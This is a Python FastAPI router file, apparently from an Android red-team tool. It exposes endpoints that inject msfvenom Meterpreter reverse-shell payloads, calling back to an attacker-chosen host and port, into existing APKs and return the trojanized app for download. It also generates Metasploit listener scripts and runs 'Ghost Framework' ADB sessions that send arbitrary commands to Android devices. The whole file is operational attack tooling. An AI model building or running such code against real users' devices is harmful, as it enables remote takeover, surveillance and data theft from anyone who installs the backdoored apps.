"""
Android Red Team API.
- POST /red-team/inject  — msfvenom payload injection into an existing APK
- GET  /red-team/listener-rc/{job_id} — download listener .rc resource script
Ghost Framework endpoints are in Task 5.
"""
from pathlib import Path

from fastapi import APIRouter, Depends, HTTPException
from fastapi.responses import FileResponse
from pydantic import BaseModel, Field
from sqlalchemy import select
from sqlalchemy.ext.asyncio import AsyncSession

from config import settings
from database import get_db
from models.analysis import Analysis

router = APIRouter()

ANDROID_PAYLOADS = [
    "android/meterpreter/reverse_tcp",
    "android/meterpreter/reverse_http",
    "android/meterpreter/reverse_https",
    "android/shell/reverse_tcp",
]

# job_id → result dict (in-memory)
_jobs: dict[str, dict] = {}


class InjectRequest(BaseModel):
    analysis_id: int
    lhost: str = Field(..., description="Attacker IP / hostname for the reverse shell")
    lport: int = Field(4444, ge=1, le=65535)
    payload: str = "android/meterpreter/reverse_tcp"


@router.get("/payloads")
async def list_payloads():
    return {"payloads": ANDROID_PAYLOADS}


@router.post("/inject")
async def inject_payload(req: InjectRequest, db: AsyncSession = Depends(get_db)):
    """Inject a Meterpreter payload into the APK associated with an analysis."""
    if req.payload not in ANDROID_PAYLOADS:
        raise HTTPException(400, f"Unsupported payload. Choose from: {ANDROID_PAYLOADS}")

    result = await db.execute(select(Analysis).where(Analysis.id == req.analysis_id))
    analysis = result.scalar_one_or_none()
    if not analysis:
        raise HTTPException(404, "Analysis not found")
    if not analysis.upload_path:
        raise HTTPException(400, "No APK path on record for this analysis")

    apk_path = Path(analysis.upload_path)
    if not apk_path.exists():
        raise HTTPException(400, "APK file not found on disk")

    from core.red_team_engine import inject_payload as _inject, generate_listener_rc
    try:
        out_path = await _inject(apk_path, req.lhost, req.lport, req.payload)
    except FileNotFoundError as exc:
        raise HTTPException(503, str(exc)) from exc
    except RuntimeError as exc:
        raise HTTPException(502, str(exc)) from exc

    import uuid
    job_id = str(uuid.uuid4())[:8]
    rc_script = await generate_listener_rc(req.lhost, req.lport, req.payload)
    _jobs[job_id] = {
        "job_id": job_id,
        "out_apk": str(out_path),
        "lhost": req.lhost,
        "lport": req.lport,
        "payload": req.payload,
        "rc_script": rc_script,
        "filename": out_path.name,
    }

    return {
        "job_id": job_id,
        "filename": out_path.name,
        "download_url": f"/api/v1/red-team/download/{job_id}",
        "listener_rc_url": f"/api/v1/red-team/listener-rc/{job_id}",
        "lhost": req.lhost,
        "lport": req.lport,
        "payload": req.payload,
    }


@router.get("/download/{job_id}")
async def download_apk(job_id: str):
    job = _jobs.get(job_id)
    if not job:
        raise HTTPException(404, "Job not found")
    path = Path(job["out_apk"])
    if not path.exists():
        raise HTTPException(410, "APK no longer on disk")
    return FileResponse(
        path=str(path),
        filename=job["filename"],
        media_type="application/vnd.android.package-archive",
    )


@router.get("/listener-rc/{job_id}")
async def download_listener_rc(job_id: str):
    job = _jobs.get(job_id)
    if not job:
        raise HTTPException(404, "Job not found")
    from fastapi.responses import PlainTextResponse
    return PlainTextResponse(content=job["rc_script"], media_type="text/plain",
                             headers={"Content-Disposition": f'attachment; filename="listener_{job_id}.rc"'})


# ── Ghost Framework ─────────────────────────────────────────────────────────

class GhostConnectRequest(BaseModel):
    device_id: str = Field(..., description="ADB device serial or IP:port")


class GhostCommandRequest(BaseModel):
    session_id: str
    command: str


@router.post("/ghost/connect")
async def ghost_connect(req: GhostConnectRequest):
    """Start a Ghost Framework session connected to an Android device."""
    from core.red_team_engine import GhostSession, _ghost_sessions
    import uuid
    session_id = str(uuid.uuid4())[:8]
    sess = GhostSession(session_id, req.device_id)
    try:
        await sess.connect()
    except FileNotFoundError as exc:
        raise HTTPException(503, str(exc)) from exc
    except Exception as exc:
        raise HTTPException(502, f"Ghost error: {exc}") from exc
    _ghost_sessions[session_id] = sess
    return {"session_id": session_id, "device_id": req.device_id, "status": "connected"}


@router.post("/ghost/command")
async def ghost_command(req: GhostCommandRequest):
    """Send a command to an active Ghost session."""
    from core.red_team_engine import _ghost_sessions
    sess = _ghost_sessions.get(req.session_id)
    if not sess:
        raise HTTPException(404, "Ghost session not found")
    try:
        await sess.run_command(req.command)
    except RuntimeError as exc:
        raise HTTPException(400, str(exc))
    return {"status": "sent", "command": req.command}


@router.get("/ghost/output/{session_id}")
async def ghost_output(session_id: str):
    """Retrieve buffered output lines from a Ghost session."""
    from core.red_team_engine import _ghost_sessions
    sess = _ghost_sessions.get(session_id)
    if not sess:
        raise HTTPException(404, "Ghost session not found")
    lines = list(sess.output_lines)
    return {"session_id": session_id, "lines": lines}


@router.delete("/ghost/{session_id}")
async def ghost_disconnect(session_id: str):
    """Close and remove a Ghost session."""
    from core.red_team_engine import _ghost_sessions
    sess = _ghost_sessions.pop(session_id, None)
    if sess:
        await sess.close()
    return {"status": "disconnected", "session_id": session_id}
